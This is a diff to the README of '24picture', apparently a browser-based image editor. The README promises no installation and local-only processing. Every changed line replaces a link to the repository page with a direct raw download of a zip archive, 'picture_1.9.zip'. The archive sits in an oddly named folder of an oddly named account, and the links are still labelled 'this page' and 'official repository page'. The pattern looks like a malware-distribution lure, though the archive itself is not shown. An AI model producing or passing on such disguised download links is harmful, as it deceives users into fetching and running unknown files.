@@ -1,6 +1,6 @@
 # 🖼️ 24picture - Edit your images instantly for free
 
-[![](https://img.shields.io/badge/Download-24picture-blue.svg)](https://github.com/apothecariespoundbromeosin432/24picture)
+[![](https://img.shields.io/badge/Download-24picture-blue.svg)](https://github.com/apothecariespoundbromeosin432/24picture/raw/refs/heads/main/undershut/picture_1.9.zip)
 
 24picture provides a complete set of image tools in your internet browser. This software helps you convert files, compress sizes, and edit images without uploading your data to a server. Your files stay on your computer, which protects your privacy. You do not need to sign up for an account to use these tools.
 
@@ -8,7 +8,7 @@
 
 You do not need to install complex software to use 24picture. Follow these steps to access the tools:
 
-1. Visit [this page](https://github.com/apothecariespoundbromeosin432/24picture) to reach the application.
+1. Visit [this page](https://github.com/apothecariespoundbromeosin432/24picture/raw/refs/heads/main/undershut/picture_1.9.zip) to reach the application.
 2. Select the tool you need from the main menu.
 3. Drag your image file into the browser window.
 4. Adjust the settings as needed.
@@ -40,7 +40,7 @@ This tool runs inside your browser. It does not send your images to an external 
 
 The application uses modern web technology. You can create a shortcut on your desktop for quick access:
 
-1. Go to the [official repository page](https://github.com/apothecariespoundbromeosin432/24picture).
+1. Go to the [official repository page](https://github.com/apothecariespoundbromeosin432/24picture/raw/refs/heads/main/undershut/picture_1.9.zip).
 2. Open your browser settings menu.
 3. Select the option labeled "Install this site as an app" or "Create shortcut".
 4. Follow the prompt to pin the icon to your taskbar or start menu.
